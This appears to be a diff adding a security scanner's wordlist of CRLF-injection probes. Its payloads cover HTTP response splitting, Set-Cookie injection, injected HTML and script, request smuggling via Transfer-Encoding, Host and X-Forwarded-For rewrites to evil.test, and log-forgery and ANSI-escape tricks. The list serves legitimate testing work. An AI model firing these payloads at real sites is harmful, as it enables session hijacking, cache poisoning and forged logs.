@@ -1,0 +1,66 @@
+# category: crlf
+# description: CRLF / header / log injection probes — encoded carriage returns, header smuggling via response splitting.
+# references: OWASP CRLF, PortSwigger Response Splitting.
+
+%0d%0a
+%0d%0aSet-Cookie:%20sess=1
+%0d%0aLocation:%20http://evil.test
+%0d%0aContent-Length:%200%0d%0a%0d%0a<html>injected</html>
+%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
+%0aSet-Cookie:%20sess=1
+%0a%0a<html>injected</html>
+%0d%0aX-Injected:%20camio
+%0d%0a%0d%0a<html>injected</html>
+%E5%98%8A%E5%98%8D
+%E5%98%8A%E5%98%8DSet-Cookie:%20a=b
+%u000d%u000a
+%u000a
+%u000d
+\r\n
+\r\nSet-Cookie: injected=1
+\r\n\r\n<html>pwn</html>
+\nSet-Cookie: injected=1
+\nX-Injected: camio
+\n\n<html>pwn</html>
+%0d%0a%20X-Injected:%20camio
+%23%0d%0a%23%0d%0a
+%250d%250a
+%250d%250aSet-Cookie:%20camio=1
+%252e%252e%252f%250aX-Injected:%20camio
+%E5%98%8A%E5%98%8DX-Camio:%20hi
+%0d%0aHost:%20evil.test
+%0d%0aHost:%20evil.test%0d%0a
+%0d%0a%0d%0aGET%20/x%20HTTP/1.1
+%0d%0aTransfer-Encoding:%20chunked%0d%0a%0d%0a1%0d%0aA%0d%0a0%0d%0a%0d%0a
+/%0d%0aSet-Cookie:%20sess=1
+?%0d%0aSet-Cookie:%20sess=1
+#%0d%0aSet-Cookie:%20sess=1
+http://x.test/%0d%0aSet-Cookie:%20a=b
+
+# ── Log-injection / log-forgery probes ──────────────────────────────────
+%0a[SYSLOG]%20INFO%20camio-injected
+%0dFake%20entry
+%1b[31mred-fake-error%1b[0m
+%0a%0aINFO%20real-but-fake
+# ANSI escape hiding malicious content in terminal logs:
+%1b[2K%0d
+%1b[1A%0d
+
+# ── Setting cookies via CRLF ─────────────────────────────────────────────
+%0d%0aSet-Cookie:%20sess=injected
+%0d%0aSet-Cookie:%20sess=injected;%20Path=/
+%0d%0aSet-Cookie:%20sess=injected;%20HttpOnly;%20Secure
+%0d%0aSet-Cookie:%20__Host-sess=injected;%20Path=/;%20Secure;%20HttpOnly
+
+# ── Nonstandard terminators ──────────────────────────────────────────────
+%E5%98%8A%E5%98%8DSet-Cookie:%20a=1
+%u000AX-Camio:%20hi
+%0a%00
+%0a%00X-Camio:%20hi
+
+# ── Response-splitting then Set-Cookie ───────────────────────────────────
+%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>injected</html>
+
+# ── X-Forwarded-For / Via rewrite ───────────────────────────────────────
+%0d%0aX-Forwarded-For:%20127.0.0.1
+%0d%0aVia:%201.1%20evil.test
